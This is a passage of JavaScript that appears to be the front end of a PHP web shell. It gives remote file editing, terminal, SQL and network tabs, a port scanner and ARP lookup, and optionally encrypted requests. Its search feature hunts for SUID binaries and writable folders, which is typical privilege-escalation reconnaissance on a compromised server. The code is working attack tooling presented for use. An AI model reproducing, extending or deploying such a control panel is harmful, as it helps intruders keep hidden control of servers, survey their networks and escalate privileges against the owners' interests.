                            <input type="number" id="batch-size" name="batch-size" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white" value="200" min="50" max="1000" title="Number of files to process per batch">
                        </div>
                        <div class="flex items-center pt-6">
                            <input type="checkbox" id="recursive-search" name="recursive-search" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded" checked>
                            <label for="recursive-search" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Recursive Search</label>
                        </div>
                    </div>
                </div>
                <div class="flex justify-end">
                    <button type="submit" class="inline-flex items-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        <svg class="mr-2 -ml-1 h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                        </svg>
                        Search
                    </button>
                </div>
            </form>
        `;
        
        const resultsContainer = document.createElement('div');
        resultsContainer.id = 'search-results-container';
        resultsContainer.className = 'search-results bg-white dark:bg-gray-800 p-4 rounded-lg shadow';
        resultsContainer.innerHTML = `
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-semibold text-gray-800 dark:text-white">Search Results</h2>
                <div id="search-stats" class="text-sm text-gray-500 dark:text-gray-400"></div>
            </div>
            <div id="search-results" class="space-y-4">
                <div class="text-gray-500 dark:text-gray-400 text-center py-8">Enter a search query and click Search</div>
            </div>
        `;
        
        tabContent.appendChild(searchForm);
        tabContent.appendChild(resultsContainer);
        
        const form = document.getElementById('advanced-search-form');
        if (form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                performAdvancedSearch();
                return false;
            });
        }
    };
    
    function validateSearchPath(path) {
        if (!path || path.trim() === '') {
            return { valid: false, message: 'Search path cannot be empty' };
        }
        
        if (path.startsWith('/')) {
            console.warn("Using absolute path for search: " + path);
        }
        
        return { valid: true };
    }
    
    window.toggleSearchMode = function(mode) {
        const textSection = document.getElementById('text-search-section');
        const permissionSection = document.getElementById('permission-search-section');
        const searchQuery = document.getElementById('search-query');
        
        if (mode === 'text') {
            textSection.classList.remove('hidden');
            permissionSection.classList.add('hidden');
            searchQuery.setAttribute('required', '');
        } else {
            textSection.classList.add('hidden');
            permissionSection.classList.remove('hidden');
            searchQuery.removeAttribute('required');
        }
    };
    
    window.performAdvancedSearch = function(searchToken = null) {
        const searchMode = document.querySelector('input[name="search-mode"]:checked').value;
        const searchPath = document.getElementById('search-path')?.value || '.';
        const fileExtensions = document.getElementById('file-extensions')?.value || '';
        const maxResults = document.getElementById('max-results')?.value || 1000;
        const recursive = document.getElementById('recursive-search')?.checked || true;
        const batchSize = parseInt(document.getElementById('batch-size')?.value || '200', 10);

        const searchQuery = document.getElementById('search-query')?.value || '';
        const caseSensitive = document.getElementById('case-sensitive')?.checked || false;
        const useRegex = document.getElementById('use-regex')?.checked || false;

        const writableOnly = document.getElementById('writable-only')?.checked || false;
        const writableFolders = document.getElementById('writable-folders')?.checked || false;
        const executableOnly = document.getElementById('executable-only')?.checked || false;
        const suidBinaries = document.getElementById('suid-binaries')?.checked || false;
        const includeHidden = document.getElementById('include-hidden')?.checked || false;

        if (searchMode === 'text' && !searchQuery && !searchToken) {
            triggerAlert('warning', 'Please enter a search query for text search');
            return;
        } else if (searchMode === 'permission' && !writableOnly && !writableFolders && !executableOnly && !suidBinaries) {
            triggerAlert('warning', 'Please select at least one permission filter');
            return;
        }
        
        if (!searchToken) {
            const pathValidation = validateSearchPath(searchPath);
            if (!pathValidation.valid) {
                triggerAlert('warning', pathValidation.message);
                return;
            }
        }
        
        
        if (!csrf) {
            console.error('CSRF token not found in phpVars');
            triggerAlert('danger', 'Security token missing. Please refresh the page and try again.');
            return;
        }
        
        const resultsContainer = document.getElementById('search-results');
        if (resultsContainer && !searchToken) {
            resultsContainer.innerHTML = `
                <div class="flex justify-center items-center py-8">
                    <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
                    <span class="ml-2 text-gray-600 dark:text-gray-300">Searching...</span>
                </div>
            `;
            
            window.currentSearch = {
                query: searchQuery,
                path: searchPath,
                extensions: fileExtensions,
                maxResults: maxResults,
                caseSensitive: caseSensitive,
                useRegex: useRegex,
                recursive: recursive,
                writableOnly: writableOnly,
                writableFolders: writableFolders,
                executableOnly: executableOnly,
                suidBinaries: suidBinaries,
                includeHidden: includeHidden,
                results: {},
                totalMatches: 0
            };
        } else if (!searchToken) {
            window.currentSearch = {
                query: searchQuery,
                path: searchPath,
                extensions: fileExtensions,
                maxResults: maxResults,
                caseSensitive: caseSensitive,
                useRegex: useRegex,
                recursive: recursive,
                writableOnly: writableOnly,
                writableFolders: writableFolders,
                executableOnly: executableOnly,
                suidBinaries: suidBinaries,
                includeHidden: includeHidden,
                results: {},
                totalMatches: 0
            };
        }
        
        if (searchToken) {
            const progressElement = document.getElementById('search-progress');
            if (progressElement) {
                progressElement.innerHTML = `
                    <div class="flex items-center">
                        <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-500 mr-2"></div>
                        <span>Continuing search...</span>
                    </div>
                `;
            }
        }
        
        console.log('Sending advanced search request:', {
            searchQuery,
            searchPath,
            fileExtensions,
            maxResults,
            caseSensitive,
            useRegex,
            recursive,
            writableOnly,
            writableFolders,
            executableOnly,
            suidBinaries,
            includeHidden,
            searchToken,
            batchSize
        });
        
        let encryptionKey = key;
        if (isEnc === '1' && typeof key === 'string') {
            encryptionKey = CryptoJS.enc.Utf8.parse(key);
            console.log('Using formatted encryption key for advanced search');
        }
        
        sendRequest({
            csrf,
            action: 'advanced_search',
            search_mode: searchMode,
            search_query: searchMode === 'text' ? searchQuery : '',  
            search_path: searchPath,
            file_extensions: fileExtensions,
            max_results: maxResults,
            case_sensitive: caseSensitive,
            use_regex: useRegex,
            recursive: recursive,
            writable_only: writableOnly,
            writable_folders: writableFolders,
            executable_only: executableOnly,
            suid_binaries: suidBinaries,
            include_hidden: includeHidden,
            search_token: searchToken,
            batch_size: batchSize
        }, encryptionKey, isEnc)
        .then(response => {
            console.log('Search response received:', response);
            displaySearchResults(response, searchToken !== null);
        })
        .catch(error => {
            console.error('Search error:', error);
            
            if (resultsContainer) {
                resultsContainer.innerHTML = `
                    <div class="text-red-500 dark:text-red-400 text-center py-4">
                        Error: ${error.message || 'Failed to perform search'}
                    </div>
                    <div class="mt-4 p-4 bg-red-50 dark:bg-red-900 border border-red-200 dark:border-red-800 rounded-md">
                        <h3 class="font-medium text-red-800 dark:text-red-300 mb-2">Troubleshooting tips:</h3>
                        <ul class="list-disc pl-5 text-sm text-red-700 dark:text-red-400 space-y-1">
                            <li>Check if the search path exists and is accessible</li>
                            <li>Try using a relative path like "./subdirectory" instead of an absolute path</li>
                            <li>If using regex, verify your pattern is valid</li>
                            <li>Try reducing the batch size if searching many files</li>
                            <li>Check browser console for more detailed error information</li>
                        </ul>
                    </div>
                `;
            }
            
            triggerAlert('danger', 'Search failed: ' + (error.message || 'Unknown error'));
        });
    };
    
    window.displaySearchResults = function(response, isIncremental = false) {
        const resultsContainer = document.getElementById('search-results');
        const searchStats = document.getElementById('search-stats');
        
        if (!resultsContainer) {
            console.error('Results container not found');
            return;
        }
        
        if (response.error) {
            resultsContainer.innerHTML = `
                <div class="text-red-500 dark:text-red-400 text-center py-4">
                    Error: ${response.error}
                </div>
            `;
            return;
        }
        
        if (isIncremental && window.currentSearch) {
            Object.assign(window.currentSearch.results, response.results);
            window.currentSearch.totalMatches = response.total_matches;
        } else {
            if (!window.currentSearch) {
                window.currentSearch = {};
            }
            window.currentSearch.results = response.results;
            window.currentSearch.totalMatches = response.total_matches;
        }
        
        if (searchStats) {
            searchStats.textContent = `Found ${window.currentSearch.totalMatches} matches in ${Object.keys(window.currentSearch.results).length} files`;
            
            if (response.memory_limit_reached) {
                searchStats.innerHTML += `
                    <div class="mt-2 text-amber-600 dark:text-amber-400">
                        <svg class="inline-block w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                        </svg>
                        Search was truncated due to memory limits. Try narrowing your search or searching in smaller directories.
                    </div>
                `;
            }
            
            if (!response.search_complete) {
                const filesRemaining = response.files_remaining || 0;
                const filesProcessed = response.files_processed || 0;
                const totalFiles = filesProcessed + filesRemaining;
                const progressPercent = totalFiles > 0 ? Math.round((filesProcessed / totalFiles) * 100) : 0;
                
                searchStats.innerHTML += `
                    <div id="search-progress" class="mt-2">
                        <div class="flex items-center justify-between mb-1">
                            <span class="text-sm text-gray-700 dark:text-gray-300">
                                Processed ${filesProcessed} of ${totalFiles} files (${progressPercent}%)
                            </span>
                        </div>
                        <div class="w-full bg-gray-200 rounded-full h-2.5 dark:bg-gray-700">
                            <div class="bg-blue-600 h-2.5 rounded-full" style="width: ${progressPercent}%"></div>
                        </div>
                        <div class="flex justify-between mt-2">
                            <div class="flex items-center">
                                <input type="checkbox" id="auto-continue-search" class="mr-2">
                                <label for="auto-continue-search" class="text-sm text-gray-700 dark:text-gray-300">Auto-continue</label>
                            </div>
                            <button id="continue-search" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 dark:bg-blue-600 dark:hover:bg-blue-700">
                                Continue Search
                            </button>
                        </div>
                    </div>
                `;
            }
        }
        
        if (window.currentSearch.totalMatches === 0 && response.search_complete) {
            resultsContainer.innerHTML = `
                <div class="text-gray-500 dark:text-gray-400 text-center py-8">
                    No results found for "${response.search_query}"
                </div>
            `;
            return;
        }
        
        let resultsHTML = '';
        
        const sortedFiles = Object.keys(window.currentSearch.results).sort((a, b) => {
            return window.currentSearch.results[b].length - window.currentSearch.results[a].length;
        });
        
        sortedFiles.forEach(filePath => {
            const matches = window.currentSearch.results[filePath];
            const fileName = filePath.split('/').pop();
            
            const isWritable = response.writable_files && response.writable_files.includes(filePath);
            const writableBadge = isWritable ? 
                `<span class="ml-2 px-2 py-0.5 text-xs font-medium bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300 rounded">Writable</span>` : 
                '<span class="ml-2 px-2 py-0.5 text-xs font-medium bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300 rounded">No Writable</span>';
            
            resultsHTML += `
                <div class="file-result border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden mb-4">
                    <div class="file-header bg-gray-100 dark:bg-gray-700 px-4 py-2 flex justify-between items-center">
                        <div class="flex items-center">
                            <span class="font-medium text-gray-800 dark:text-white">${fileName}</span>
                            <span class="ml-2 text-sm text-gray-500 dark:text-gray-400">${matches.length} matches</span>
                            ${writableBadge}
                        </div>
                        <div class="flex space-x-2">
                            <button class="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300 text-sm" 
                                    onclick="viewEditFile('${filePath}', '${window.phpVars?.csrf || ''}', '${window.phpVars?.encryptionKey || ''}', ${window.phpVars?.isEnc || false})">
                                Edit
                            </button>
                            <button class="text-gray-600 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-300 text-sm toggle-matches" 
                                    data-file="${filePath}">
                                Hide Matches
                            </button>
                        </div>
                    </div>
                    <div class="file-matches bg-white dark:bg-gray-800 p-2">
                        <div class="text-xs text-gray-500 dark:text-gray-400 mb-2">${filePath}</div>
                        <div class="matches-list space-y-1">
            `;
            
            matches.forEach(match => {
                const escapedContent = match.line_content
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;');
                
                let highlightedContent = escapedContent;
                if (!document.getElementById('use-regex')?.checked) {
                    const searchQuery = document.getElementById('search-query')?.value || '';
                    if (searchQuery) {
                        const flags = document.getElementById('case-sensitive')?.checked ? 'g' : 'gi';
                        const regex = new RegExp(searchQuery.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), flags);
                        highlightedContent = escapedContent.replace(regex, '<mark class="bg-yellow-200 dark:bg-yellow-700">$&</mark>');
                    }
                }
                
                resultsHTML += `
                    <div class="match-line hover:bg-gray-50 dark:hover:bg-gray-700 p-1 rounded">
                        <a href="#" class="flex" onclick="viewEditFileAtLine('${filePath}', ${match.line_number}, '${window.phpVars?.csrf || ''}', '${window.phpVars?.encryptionKey || ''}', ${window.phpVars?.isEnc || false}); return false;">
                            <span class="line-number w-12 inline-block text-right pr-2 text-gray-500 dark:text-gray-400 select-none">${match.line_number}</span>
                            <span class="line-content font-mono text-gray-800 dark:text-gray-200 overflow-x-auto">${highlightedContent}</span>
                        </a>
                    </div>
                `;
            });
            
            resultsHTML += `
                        </div>
                    </div>
                </div>
            `;
        });
        
        resultsContainer.innerHTML = resultsHTML;
        
        document.querySelectorAll('.toggle-matches').forEach(button => {
            button.addEventListener('click', function() {
                const filePath = this.getAttribute('data-file');
                const matchesContainer = this.closest('.file-result').querySelector('.matches-list');
                
                if (matchesContainer.style.display === 'none') {
                    matchesContainer.style.display = 'block';
                    this.textContent = 'Hide Matches';
                } else {
                    matchesContainer.style.display = 'none';
                    this.textContent = 'Show Matches';
                }
            });
        });
        
        if (!response.search_complete) {
            const continueButton = document.getElementById('continue-search');
            const autoContinueCheckbox = document.getElementById('auto-continue-search');
            
            if (continueButton) {
                continueButton.addEventListener('click', function() {
                    performAdvancedSearch(response.search_token);
                });
            }
            
            if (autoContinueCheckbox) {
                const savedAutoContinue = localStorage.getItem('search-auto-continue');
                if (savedAutoContinue === 'true') {
                    autoContinueCheckbox.checked = true;
                }
                
                autoContinueCheckbox.addEventListener('change', function() {
                    localStorage.setItem('search-auto-continue', this.checked);
                });
                
                if (autoContinueCheckbox.checked) {
                    setTimeout(() => {
                        performAdvancedSearch(response.search_token);
                    }, 1000); 
                }
            }
        }
    };
    
    window.viewEditFileAtLine = function(filePath, lineNumber, csrf, key, isEnc) {
        console.log(`Attempting to open ${filePath} at line ${lineNumber}`);
        
        viewEditFile(filePath, csrf, key, isEnc);
        
        let attempts = 0;
        const maxAttempts = 20; 
        const checkInterval = 300; 
        
        const checkEditor = function() {
            console.log(`Checking for editor (attempt ${attempts + 1}/${maxAttempts})`);
            
            if (window.editor) {
                console.log(`Editor found, navigating to line ${lineNumber}`);
                try {
                    window.editor.setCursor(lineNumber - 1, 0);
                    
                    window.editor.addLineClass(lineNumber - 1, 'background', 'bg-yellow-100');
                    
                    window.editor.scrollIntoView({line: lineNumber - 1, ch: 0}, 100);
                    
                    console.log('Successfully positioned editor at line', lineNumber);
                } catch (error) {
                    console.error('Error positioning editor:', error);
                    triggerAlert('warning', 'Could not position to the selected line. Please try manually navigating to line ' + lineNumber);
                }
            } else {
                attempts++;
                if (attempts < maxAttempts) {
                    console.log(`Editor not ready yet, attempt ${attempts}/${maxAttempts}`);
                    setTimeout(checkEditor, checkInterval);
                } else {
                    console.error('Editor failed to initialize after multiple attempts');
                    triggerAlert('warning', 'Could not position to the selected line. Please try manually navigating to line ' + lineNumber);
                }
            }
        };
        
        setTimeout(checkEditor, 800); 
    };
    
    window.saveToLocalStorage = saveToLocalStorage;
    window.getFromLocalStorage = getFromLocalStorage;
        
    window.freeclipbroad = typeof freeclipbroad === 'function' ? 
        freeclipbroad : function() { console.error('freeclipbroad not found'); };
        
    window.performBulkAction = typeof performBulkAction === 'function' ? 
        performBulkAction : function() { console.error('performBulkAction not found'); };
        
    window.sendBulkActionRequest = function({ action, files, options = null, onSuccess = null, onError = null }) {
        const currentDir = window.fileManagerState?.currentDir || phpVars?.currentDir;
        
        if (typeof progr === 'function') progr();
        
        console.log(`Sending ${action} request for ${files.length} file(s)`);
        
        const data = {
            csrf: csrf,
            action: action,
            file: files,
            dir: currentDir
        };
        
        if (action === 'zip' && options) {
            data.zipExt = options.zipFileName;
            data.compressionLevel = options.compressionLevel || '5';
            data.archiveFormat = options.archiveFormat || 'zip';
        }
        
        const jsonData = JSON.stringify(data);
        const requestData = (isEnc === '1') ? encrypt(jsonData, key) : jsonData;
        
        $.post('', requestData, function(response) {
            try {
                const decryptedResponse = (isEnc === '1') ? decrypt(response, key) : response;
                const result = JSON.parse(decryptedResponse);
                
                console.log('Response:', result);
                
                if (result.error) {
                    triggerAlert('warning', result.error);
                    if (onError) onError(result.error);
                } else if (result.success) {
                    if (onSuccess) onSuccess(result);
                    else triggerAlert('success', result.success);
                } else {
                    if (onSuccess) onSuccess(result);
                    else triggerAlert('success', 'Operation completed successfully');
                }
            } catch (error) {
                console.error('Error processing response:', error);
                triggerAlert('error', 'Failed to process server response');
                if (onError) onError(error);
            }
            
            if (typeof dprogr === 'function') dprogr();
        }).fail(function(xhr, status, error) {
            console.error('Request failed:', status, error);
            triggerAlert('error', 'Request failed: ' + (error || 'Unknown error'));
            if (onError) onError(error);
            if (typeof dprogr === 'function') dprogr();
        });
    };
        
    window.renameFile = typeof renameFile === 'function' ? 
        renameFile : function() { console.error('renameFile not found'); };
        
    window.loadDirectory = typeof loadDirectory === 'function' ? 
        loadDirectory : function() { console.error('loadDirectory not found'); };
        
    window.triggerAlert = typeof triggerAlert === 'function' ? 
        triggerAlert : function() { console.error('triggerAlert not found'); };
        
    window.showConfirmation = typeof showConfirmation === 'function' ? 
        showConfirmation : function() { console.error('showConfirmation not found'); };
        
    window.encrypt = typeof encrypt === 'function' ? 
        encrypt : function() { console.error('encrypt not found'); };
        
    window.decrypt = typeof decrypt === 'function' ? 
        decrypt : function() { console.error('decrypt not found'); };
        
    window.progr = typeof progr === 'function' ? 
        progr : function() { console.error('progr not found'); };
        
    window.dprogr = typeof dprogr === 'function' ? 
        dprogr : function() { console.error('dprogr not found'); };
}

function handleTabSwitch(tabId) {
     
    const tabButton = document.querySelector(`[data-tabs-target="${tabId}"]`);
    const tabContent = document.querySelector(tabId);
    
    if (!tabButton || !tabContent) {
        console.error('Tab elements not found:', tabId);
        return;
    }
    
    document.querySelectorAll('[role="tab"]').forEach(tab => {
        tab.setAttribute('aria-selected', 'false');
        tab.classList.remove('text-blue-600', 'border-blue-600');
        tab.classList.add('border-transparent');
    });
    
    document.querySelectorAll('[role="tabpanel"]').forEach(panel => {
        panel.classList.add('hidden');
    });
    
    tabButton.setAttribute('aria-selected', 'true');
    tabButton.classList.add('text-blue-600', 'border-blue-600');
    tabButton.classList.remove('border-transparent');
    
    tabContent.classList.remove('hidden');
    tabContent.classList.add('animate-fadeIn');
    
    const locationTabsContainer = document.querySelector('.mb-4.border-b.border-gray-200.dark\\:border-gray-700');
    const breadcrumbs = document.getElementById('breadcrumbs');
    
    if (locationTabsContainer && breadcrumbs) {
        if (tabId === '#terminal' || tabId === '#config' || tabId === '#setting' || tabId === '#sql' || tabId === '#network') {
            console.log('Hiding navigation elements for tab:', tabId);
            locationTabsContainer.classList.add('hidden');
            breadcrumbs.classList.add('hidden');
            
            const fileManagerUI = document.getElementById('fileManagerUI');
            if (fileManagerUI) {
                fileManagerUI.style.display = 'none';
            }
            
            document.querySelectorAll('.tabs-panel').forEach(panel => {
                panel.classList.add('hidden');
            });
        } else {
             locationTabsContainer.classList.remove('hidden');
            breadcrumbs.classList.remove('hidden');
            
            if (tabId === '#file') {
                const fileManagerUI = document.getElementById('fileManagerUI');
                if (fileManagerUI) {
                    fileManagerUI.style.display = 'block';
                }
            }
        }
    }
    
    if (typeof window.updateKeydownListener === 'function') {
        setTimeout(window.updateKeydownListener, 100);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('[data-tabs-target]').forEach(tab => {
        tab.addEventListener('click', function() {
            const target = this.getAttribute('data-tabs-target');
            handleTabSwitch(target);
        });
    });
    
    const activeTab = document.querySelector('[role="tab"][aria-selected="true"]');
    const tabId = activeTab ? activeTab.getAttribute('data-tabs-target') : '#file';
    handleTabSwitch(tabId);
});

    window.showConfirmation = typeof showConfirmation === 'function' ? 
        showConfirmation : function() { console.error('showConfirmation not found'); };
        
    window.diagnoseFunctions = function() {
        console.log('--- Function Diagnostic Report ---');
        console.log('updateSelectedFiles:', typeof window.updateSelectedFiles === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('saveToLocalStorage:', typeof window.saveToLocalStorage === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('getFromLocalStorage:', typeof window.getFromLocalStorage === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('freeclipbroad:', typeof window.freeclipbroad === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('performBulkAction:', typeof window.performBulkAction === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('renameFile:', typeof window.renameFile === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('loadDirectory:', typeof window.loadDirectory === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('triggerAlert:', typeof window.triggerAlert === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('showConfirmation:', typeof window.showConfirmation === 'function' ? 'Available ✓' : 'Missing ✗');
        console.log('showAdvancedSearch:', typeof window.showAdvancedSearch === 'function' ? 'Available ✓' : 'Missing ✗');
        
        console.log('--- fileManagerState Report ---');
        console.log('fileManagerState:', window.fileManagerState ? 'Available ✓' : 'Missing ✗');
        if (window.fileManagerState) {
            console.log('selectedFiles:', Array.isArray(window.fileManagerState.selectedFiles) ? 
                `Available ✓ (${window.fileManagerState.selectedFiles.length} items)` : 'Missing ✗');
            console.log('currentDir:', window.fileManagerState.currentDir || 'Not set');
        }
        
        console.log('--- phpVars Report ---');
        console.log('phpVars:', window.phpVars ? 'Available ✓' : 'Missing ✗');
        if (window.phpVars) {
            console.log('csrf:', window.phpVars.csrf ? 'Available ✓' : 'Missing ✗');
            console.log('isEnc:', window.phpVars.isEnc !== undefined ? 'Available ✓' : 'Missing ✗');
            console.log('encryptionKey:', window.phpVars.encryptionKey ? 'Available ✓' : 'Missing ✗');
        }
    };
    
    
 
    document.addEventListener('DOMContentLoaded', function() {
         
        initThemeToggle();
        
        initEnhancedTabs();
        
        initSettings();
        
        initGlobalKeyboardShortcuts();
        
        exposeUtilityFunctions();
        
        if (typeof phpVars !== 'undefined' && !window.phpVars) {
            window.phpVars = phpVars;
            console.log('phpVars initialized globally');
        } else if (!window.phpVars) {
            console.warn('phpVars not found in global scope');
        }
        
        document.querySelector('.advanced-search')?.addEventListener('click', function() {
            if (typeof window.showAdvancedSearch === 'function') {
                window.showAdvancedSearch();
            } else {
                console.error('Advanced search function not found');
                triggerAlert('warning', 'Advanced search feature is not available');
            }
        });
    });

    window.saveTabsToLocalStorage = function() {
        try {
            const tabsToSave = fileManagerState.tabs.map(tab => ({
                id: tab.id,
                path: tab.path,
                active: tab.active,
                name: tab.name,
                type: tab.type || 'filemanager'
            }));
            
            localStorage.setItem('fileManager_activeTabId', fileManagerState.activeTabId);
            
            localStorage.setItem('fileManager_tabs', JSON.stringify(tabsToSave));
            
         } catch (error) {
            console.error('Error saving tabs to localStorage:', error);
        }
    }

    window.loadTabsFromLocalStorage = function() {
        try {
            const savedTabsJson = localStorage.getItem('fileManager_tabs');
            if (!savedTabsJson) {
                console.log('No saved tabs found in localStorage');
                return false;
            }
            
            const savedTabs = JSON.parse(savedTabsJson);
            if (!Array.isArray(savedTabs) || savedTabs.length === 0) {
                console.log('Invalid or empty tabs data in localStorage');
                return false;
            }
            
            const savedActiveTabId = localStorage.getItem('fileManager_activeTabId');
            
            fileManagerState.tabs = savedTabs;
            
            if (savedActiveTabId && fileManagerState.tabs.find(tab => tab.id === savedActiveTabId)) {
                fileManagerState.activeTabId = savedActiveTabId;
                
                fileManagerState.tabs.forEach(tab => {
                    tab.active = (tab.id === savedActiveTabId);
                });
            } else {
                fileManagerState.tabs[0].active = true;
                fileManagerState.activeTabId = fileManagerState.tabs[0].id;
            }
            
             return true;
        } catch (error) {
            console.error('Error loading tabs from localStorage:', error);
            return false;
        }
    }

    function saveToLocalStorage(fileNames) {
        try {
            const normalizedPaths = fileNames.map(file => {
                if (file.startsWith('/') || file.includes(':/')) {
                    return file;
                }
                
                const currentDir = window.fileManagerState?.currentDir || phpVars?.currentDir;
                
                if (currentDir.endsWith('/')) {
                    return currentDir + file;
                } else {
                    return currentDir + '/' + file;
                }
            });
            
            localStorage.setItem('copiedFiles', JSON.stringify(normalizedPaths));
            console.log('Saved to clipboard:', normalizedPaths);
            return normalizedPaths;
        } catch (error) {
            console.error('Error saving to localStorage:', error);
            return [];
        }
    }

    function getFromLocalStorage() {
        try {
            const storedFiles = localStorage.getItem('copiedFiles');
            if (!storedFiles) {
                console.log('No files found in clipboard');
                return [];
            }
            
            const files = JSON.parse(storedFiles);
            console.log('Retrieved from clipboard:', files);
            return files;
        } catch (error) {
            console.error('Error retrieving from localStorage:', error);
            return [];
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const networkTab = document.getElementById('network-tab');
        if (networkTab) {
            networkTab.addEventListener('click', function() {
                initNetworkTools();
            });
        }
    });

    function initNetworkTools() {
        const portScannerForm = document.getElementById('portScannerForm');
        if (portScannerForm) {
            portScannerForm.addEventListener('submit', function(e) {
                e.preventDefault();
                performPortScan();
            });
        }
        
        const getNetworkInfoBtn = document.getElementById('getNetworkInfo');
        if (getNetworkInfoBtn) {
            getNetworkInfoBtn.addEventListener('click', function() {
                getNetworkInfo();
            });
        }
        
        const getArpTableBtn = document.getElementById('getArpTable');
        if (getArpTableBtn) {
            getArpTableBtn.addEventListener('click', function() {
                getArpTable();
            });
        }
        
        const pingForm = document.getElementById('pingForm');
        if (pingForm) {
            pingForm.addEventListener('submit', function(e) {
                e.preventDefault();
                performPing();
            });
        }
        
        const dnsLookupForm = document.getElementById('dnsLookupForm');
        if (dnsLookupForm) {
            dnsLookupForm.addEventListener('submit', function(e) {
                e.preventDefault();
                performDnsLookup();
            });
        }
        
        const tracerouteForm = document.getElementById('tracerouteForm');
        if (tracerouteForm) {
            tracerouteForm.addEventListener('submit', function(e) {
                e.preventDefault();
                performTraceroute();
            });
        }
        
        const whoisForm = document.getElementById('whoisForm');
        if (whoisForm) {
            whoisForm.addEventListener('submit', function(e) {
                e.preventDefault();
                performWhoisLookup();
            });
        }
    }

    function performPortScan() {
        const host = document.getElementById('hostInput').value;
        const startPort = parseInt(document.getElementById('startPortInput').value);
        const endPort = parseInt(document.getElementById('endPortInput').value);
        const timeout = parseInt(document.getElementById('timeoutInput').value);
        const commonPortsOnly = document.getElementById('commonPortsOnly').checked;
        
        if (!host) {
            triggerAlert('warning', 'Please enter a host/IP address');
            return;
        }
        
        const resultsContainer = document.getElementById('portScanResults');
        const scanStatus = document.getElementById('scanStatus');
        const resultsBody = document.getElementById('portScanResultsBody');
        
        resultsContainer.classList.remove('hidden');
        scanStatus.textContent = `Scanning ${host}...`;
        resultsBody.innerHTML = '<tr><td colspan="3" class="text-center py-2">Scanning...</td></tr>';
        
        const params = {
            host: host,
            start_port: startPort,
            end_port: endPort,
            timeout: timeout,
            common_ports_only: commonPortsOnly
        };
        
        sendNetworkRequest('port_scan', params)
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    scanStatus.textContent = `Scan failed: ${response.error}`;
                    resultsBody.innerHTML = '<tr><td colspan="3" class="text-center py-2 text-red-500">Scan failed</td></tr>';
                    return;
                }
                
                scanStatus.textContent = `Scan completed for ${response.host}`;
                
                resultsBody.innerHTML = '';
                
                const openPorts = response.results.filter(result => result.status === 'open');
                const closedPorts = response.results.filter(result => result.status === 'closed');
                
                if (openPorts.length === 0) {
                    resultsBody.innerHTML = '<tr><td colspan="3" class="text-center py-2">No open ports found</td></tr>';
                } else {
                    openPorts.forEach(result => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td class="px-4 py-2">${result.port}</td>
                            <td class="px-4 py-2"><span class="px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">open</span></td>
                            <td class="px-4 py-2">${result.service || 'unknown'}</td>
                        `;
                        resultsBody.appendChild(row);
                    });
                    
                    if (closedPorts.length > 0) {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td colspan="3" class="px-4 py-2 text-gray-500 italic">${closedPorts.length} port(s) closed or filtered</td>
                        `;
                        resultsBody.appendChild(row);
                    }
                }
            })
            .catch(error => {
                triggerAlert('warning', 'Error performing port scan');
                scanStatus.textContent = 'Scan failed';
                resultsBody.innerHTML = '<tr><td colspan="3" class="text-center py-2 text-red-500">Error connecting to server</td></tr>';
            });
    }

    function getNetworkInfo() {
        const resultsContainer = document.getElementById('networkInfoResults');
        resultsContainer.classList.remove('hidden');
        resultsContainer.innerHTML = '<div class="text-center py-2">Loading network information...</div>';
        
        sendNetworkRequest('network_info', {})
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsContainer.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                let html = '<div class="space-y-4">';
                
                if (response.interfaces.length === 0) {
                    html += '<div class="text-center py-2">No network interfaces found</div>';
                } else {
                    response.interfaces.forEach(iface => {
                        html += `
                            <div class="border-b pb-3 dark:border-gray-600">
                                <h4 class="font-medium text-gray-800 dark:text-gray-200">${iface.name}</h4>
                                <div class="mt-2">
                        `;
                        
                        if (iface.addresses.length === 0) {
                            html += '<p class="text-sm text-gray-600 dark:text-gray-400">No addresses</p>';
                        } else {
                            iface.addresses.forEach(addr => {
                                html += `
                                    <div class="flex flex-col text-sm">
